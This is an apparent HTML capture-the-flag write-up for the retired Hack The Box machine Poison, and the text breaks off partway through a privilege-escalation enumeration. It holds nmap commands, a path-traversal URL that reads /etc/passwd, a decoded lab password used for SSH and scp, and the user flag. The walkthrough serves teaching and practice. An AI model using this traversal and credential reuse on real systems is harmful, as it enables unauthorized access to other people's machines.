@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.red</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <a id="h1-1" name="h1-1"></a><strong></strong>
+        <h1><strong>hackthebox Poison</strong></h1>
+        <em>Released: 24th March 2018 / Pwned: 24th October 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png" width="435px"><br>
+        <br>
+        Poison is a FreeBSD machine. A web server leads you to an encrypted password backup, which upon decryption you can use to gain access to box via ssh. Using the same decrypted password, you extract a zip file in the user's home folder. There's VNC session running as root. If you port forward the VNC session out to your attacking machine, you can log in to the root VNC session using the password file extract from the zip.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial TCP all-ports scan:<br>
+        <code>nmap -p- -T4 -oN nmap/tcp-allports.txt 10.10.10.84</code><br>
+        <br>
+        Run service enumeration, default scripts and OS detection against open TCP ports:<br>
+        <code>nmap -p &lt;open ports&gt; -T4 -sV -sC -O -oN nmap/tcp-openports.txt 10.10.10.84</code><br>
+        <br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>poison]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#mkdir&nbsp;nmap</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>poison]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap/tcp-all.txt&nbsp;10.10.10.84</span><br>
+                [..]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;&nbsp;&nbsp;SERVICE<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span><br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http<br>
+                5394<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;filtered&nbsp;unknown<br>
+                56178<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;filtered&nbsp;unknown<br>
+                <br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>poison]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p&nbsp;22,80,5394,56178&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp-open.txt&nbsp;10.10.10.84</span><br>
+                [..]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;SERVICE&nbsp;VERSION<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.2&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>FreeBSD&nbsp;20161230<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;protocol&nbsp;2.0<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ssh-hostkey<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;2048&nbsp;e3<span style="color:#ff9d00;font-weight:700">:</span>3b<span style="color:#ff9d00;font-weight:700">:</span>7d<span style="color:#ff9d00;font-weight:700">:</span>3c<span style="color:#ff9d00;font-weight:700">:</span>8f<span style="color:#ff9d00;font-weight:700">:</span>4b<span style="color:#ff9d00;font-weight:700">:</span>8c<span style="color:#ff9d00;font-weight:700">:</span>f9<span style="color:#ff9d00;font-weight:700">:</span>cd<span style="color:#ff9d00;font-weight:700">:</span>7f<span style="color:#ff9d00;font-weight:700">:</span>d2<span style="color:#ff9d00;font-weight:700">:</span>3a<span style="color:#ff9d00;font-weight:700">:</span>ce<span style="color:#ff9d00;font-weight:700">:</span>2d<span style="color:#ff9d00;font-weight:700">:</span>ff<span style="color:#ff9d00;font-weight:700">:</span>bb&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>RSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;256&nbsp;4c<span style="color:#ff9d00;font-weight:700">:</span>e8<span style="color:#ff9d00;font-weight:700">:</span>c6<span style="color:#ff9d00;font-weight:700">:</span>02<span style="color:#ff9d00;font-weight:700">:</span>bd<span style="color:#ff9d00;font-weight:700">:</span>fc<span style="color:#ff9d00;font-weight:700">:</span>83<span style="color:#ff9d00;font-weight:700">:</span>ff<span style="color:#ff9d00;font-weight:700">:</span>c9<span style="color:#ff9d00;font-weight:700">:</span>80<span style="color:#ff9d00;font-weight:700">:</span>01<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>7d<span style="color:#ff9d00;font-weight:700">:</span>22<span style="color:#ff9d00;font-weight:700">:</span>81<span style="color:#ff9d00;font-weight:700">:</span>72&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ECDSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;256&nbsp;0b<span style="color:#ff9d00;font-weight:700">:</span>8f<span style="color:#ff9d00;font-weight:700">:</span>d5<span style="color:#ff9d00;font-weight:700">:</span>71<span style="color:#ff9d00;font-weight:700">:</span>85<span style="color:#ff9d00;font-weight:700">:</span>90<span style="color:#ff9d00;font-weight:700">:</span>13<span style="color:#ff9d00;font-weight:700">:</span>85<span style="color:#ff9d00;font-weight:700">:</span>61<span style="color:#ff9d00;font-weight:700">:</span>8b<span style="color:#ff9d00;font-weight:700">:</span>eb<span style="color:#ff9d00;font-weight:700">:</span>34<span style="color:#ff9d00;font-weight:700">:</span>13<span style="color:#ff9d00;font-weight:700">:</span>5f<span style="color:#ff9d00;font-weight:700">:</span>94<span style="color:#ff9d00;font-weight:700">:</span>3b&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ED25519<span style="color:#ff9d00;font-weight:700">)</span><br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.29&nbsp;<span style="color:#ff9d00;font-weight:700">((</span>FreeBSD<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;PHP<span style="color:#ff9d00;font-weight:700">/</span>5.6.32<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache<span style="color:#ff9d00;font-weight:700">/</span>2.4.29&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>FreeBSD<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;PHP<span style="color:#ff9d00;font-weight:700">/</span>5.6.32<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Site&nbsp;doesnt&nbsp;have&nbsp;a&nbsp;title&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>text<span style="color:#ff9d00;font-weight:700">/</span>html<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;charset=UTF-8<span style="color:#ff9d00;font-weight:700">)</span>.<br>
+                5394<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;closed&nbsp;unknown<br>
+                56178<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;closed&nbsp;unknown<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Analysis:<br>
+        • 22/ssh - Nothing do here, but useful to know for later<br>
+        • 80/http - A website! Which are always useful to find<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http - poison.htb</strong></h2><br>
+        Visit <code>http://10.10.10.84</code><br>
+        It appears there's a list of PHP files available to us for “testing�.<br>
+        <br>
+        <code>listfiles.php</code> sounds interesting.<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        <code>Ctrl + U</code> to view the source for a better output.<br>
+        There's a list a files in the current directory.<br>
+        <code>pwdbackup.txt</code> is taunting us.<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        It's a password, and it's been encoded “at leat 13 times�.<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        The password is base64.<br>
+        You could write a script, or be lazy like me and decode it 13 times over at <code>base64decode.org</code>,<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        The password is <code>Charix!2#4%6&amp;8(0</code>.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) /etc/passwd</strong></h2><br>
+        We need to know whose password this is.<br>
+        Use the website to include <code>/etc/passwd</code>.<br>
+        <br>
+        <code>http://poison.htb/browse.php?file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</code><br>
+        <br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        There's only 1 real user on the box - <code>charix</code>.<br>
+        And considering the password has the phrase <code>Charix</code> in it, I'm guessing the backed up, encrypted password is charix's.<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) ssh as charix</strong></h2><br>
+        SSH into the box as charix, and grab <code>user.txt</code>.<br>
+            <div class="codebox">
+                ┌─[horace@parrot]─[~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>poison]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ssh&nbsp;charix@10.10.10.84</span><br>
+                [...]<br>
+                Password&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">charix</span>@Poison:&nbsp;Charix!2#4%6&amp;8(0<br>
+                Last&nbsp;login:&nbsp;Mon&nbsp;Mar&nbsp;19&nbsp;16:38:00&nbsp;2018&nbsp;from&nbsp;10.10.14.4<br>
+                FreeBSD&nbsp;11.1-RELEASE&nbsp;(GENERIC)&nbsp;#0&nbsp;r321309:&nbsp;Fri&nbsp;Jul&nbsp;21&nbsp;02:08:28&nbsp;UTC&nbsp;2017<br>
+                <br>
+                Welcome&nbsp;to&nbsp;FreeBSD!<br>
+                <br>
+                [...]<br>
+                charix@Poison:~&nbsp;%&nbsp;ls&nbsp;-l<br>
+                total&nbsp;8<br>
+                -rw-r-----&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;charix&nbsp;&nbsp;166&nbsp;Mar&nbsp;19&nbsp;&nbsp;2018&nbsp;secret.zip<br>
+                -rw-r-----&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;charix&nbsp;&nbsp;&nbsp;33&nbsp;Mar&nbsp;19&nbsp;&nbsp;2018&nbsp;user.txt<br>
+                charix@Poison:~&nbsp;%&nbsp;cat&nbsp;user.txt<br>
+                eaacdfb2d141b72a589233063604209c
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) secret.zip</strong></h2><br>
+        There's a <code>secret.zip</code> file... And it requires a password.<br>
+            <div class="codebox">
+                charix@Poison<span style="color:#ff9d00;font-weight:700">:</span>~&nbsp;%&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;secret.zip<br>
+                secret.zip<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Zip&nbsp;archive&nbsp;data,&nbsp;at&nbsp;least&nbsp;v2.0&nbsp;to&nbsp;extract<br>
+                charix@Poison<span style="color:#ff9d00;font-weight:700">:</span>~&nbsp;%&nbsp;<span style="color:#ff9d00;font-weight:700">unzip</span>&nbsp;secret.zip<br>
+                Archive<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;secret.zip<br>
+                &nbsp;extracting<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;secret&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">unzip:</span>&nbsp;Passphrase&nbsp;required&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">this</span>&nbsp;entry
+            </div>
+        </div><br>
+        <br>
+        Transfer it to your attacking machine with <code>scp</code>.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>poison]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#scp&nbsp;charix@10.10.10.84:/home/charix/secret.zip&nbsp;.&nbsp;</span><br>
+                [..]<br>
+                Password&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">charix</span>@Poison:&nbsp;Charix!2#4%6&amp;8(0<br>
+                secret.zip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;&nbsp;166&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5.2KB/s&nbsp;&nbsp;&nbsp;00:00&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Unzip it using <code>unzip</code> and charix's password.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>poison]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#unzip&nbsp;secret.zip</span><br>
+                Archive<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;secret.zip<br>
+                [secret.zip]&nbsp;secret&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Charix<span style="color:#ff9d00;font-weight:700">!</span>2#4%6<span style="color:#ff9d00;font-weight:700">&amp;</span>8<span style="color:#ff9d00;font-weight:700">(</span>0<br>
+                &nbsp;extracting<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;secret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>poison]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cat&nbsp;secret</span><br>
+                ��[<span style="color:#ff9d00;font-weight:700">|</span>Ֆz<span style="color:#ff9d00;font-weight:700">!</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>poison]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#file&nbsp;secret</span><br>
+                secret<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Non-ISO&nbsp;extended-ASCII&nbsp;text,&nbsp;with&nbsp;no&nbsp;line&nbsp;terminators
+            </div>
+        </div><br>
+        <br>
+        It's gibberish.<br>
+        <code>uchardet</code> detects the encoding as WINDOWS-1252, but this doesn't bring any enlightenment.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>poison]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#uchardet&nbsp;secret</span><br>
+                WINDOWS-1252<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#iconv&nbsp;-f&nbsp;WINDOWS-1252&nbsp;-t&nbsp;UTF-8&nbsp;secret&nbsp;&gt;&nbsp;secret.w1252</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>poison]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cat&nbsp;secret.w1252&nbsp;</span><br>
+                ½¨[<span style="color:#ff9d00;font-weight:700">|</span>Õ–z<span style="color:#ff9d00;font-weight:700">!</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) VNC</strong></h2><br>
+        List the processes running as root on the system with <code>ps aux | grep root</code>.<br>
+            <div class="codebox">
+                charix@Poison<span style="color:#ff9d00;font-weight:700">:</span>~&nbsp;%&nbsp;<span style="color:#ff9d00;font-weight:700">ps</span>&nbsp;aux&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;root<br>
+                [...]<br>
+                root&nbsp;&nbsp;&nbsp;&nbsp;529&nbsp;&nbsp;&nbsp;0.0&nbsp;&nbsp;0.9&nbsp;&nbsp;23620&nbsp;&nbsp;9112&nbsp;v0-&nbsp;I&nbsp;&nbsp;&nbsp;&nbsp;13<span style="color:#ff9d00;font-weight:700">:</span>12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>00.17&nbsp;Xvnc&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>1&nbsp;-desktop&nbsp;X&nbsp;-httpd&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>tightvnc<span style="color:#ff9d00;font-weight:700">/</span>classes&nbsp;-auth&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>.Xauthority&nbsp;-geometry&nbsp;1280x800&nbsp;-depth&nbsp;24&nbsp;-rfbwait&nbsp;1200<br>
+                [..]
+            </div>
+        </div><br>
+        <br>
+        There's a VNC session running as root.<br>
+        <br>
+        Use <code>socstat -4</code> to list the listening IPv4 services.<br>
+        VNC is listening on localhost port 5901.<br>
+            <div class="codebox">
+                charix@Poison<span style="color:#ff9d00;font-weight:700">:</span>~&nbsp;%&nbsp;sockstat&nbsp;-4<br>
+                USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;COMMAND&nbsp;&nbsp;&nbsp;&nbsp;PID&nbsp;&nbsp;&nbsp;FD&nbsp;PROTO&nbsp;&nbsp;LOCAL&nbsp;ADDRESS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FOREIGN&nbsp;ADDRESS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                charix&nbsp;&nbsp;&nbsp;sshd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1361&nbsp;&nbsp;3&nbsp;&nbsp;tcp4&nbsp;&nbsp;&nbsp;10.10.10.84<span style="color:#ff9d00;font-weight:700">:</span>22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.10.14.18<span style="color:#ff9d00;font-weight:700">:</span>57480<br>
+                root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sshd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1358&nbsp;&nbsp;3&nbsp;&nbsp;tcp4&nbsp;&nbsp;&nbsp;10.10.10.84<span style="color:#ff9d00;font-weight:700">:</span>22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.10.14.18<span style="color:#ff9d00;font-weight:700">:</span>57480<br>
+                charix&nbsp;&nbsp;&nbsp;sshd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1088&nbsp;&nbsp;3&nbsp;&nbsp;tcp4&nbsp;&nbsp;&nbsp;10.10.10.84<span style="color:#ff9d00;font-weight:700">:</span>22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.10.14.18<span style="color:#ff9d00;font-weight:700">:</span>49800<br>
+                root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sshd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1085&nbsp;&nbsp;3&nbsp;&nbsp;tcp4&nbsp;&nbsp;&nbsp;10.10.10.84<span style="color:#ff9d00;font-weight:700">:</span>22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.10.14.18<span style="color:#ff9d00;font-weight:700">:</span>49800<br>
+                www&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;724&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;tcp4&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>*<br>
+                www&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;720&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;tcp4&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>*<br>
+                root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendmail&nbsp;&nbsp;&nbsp;642&nbsp;&nbsp;&nbsp;3&nbsp;&nbsp;tcp4&nbsp;&nbsp;&nbsp;127.0.0.1<span style="color:#ff9d00;font-weight:700">:</span>25&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>*<br>
+                www&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;641&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;tcp4&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>*<br>
+                www&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;640&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;tcp4&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>*<br>
+                www&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;639&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;tcp4&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>*<br>
+                www&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;638&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;tcp4&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>*<br>
+                www&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;637&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;tcp4&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>*<br>
+                root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;625&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;tcp4&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>*<br>
+                root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sshd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;620&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;tcp4&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>*<br>
+                root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Xvnc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;529&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;tcp4&nbsp;&nbsp;&nbsp;127.0.0.1<span style="color:#ff9d00;font-weight:700">:</span>5901&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>*<br>
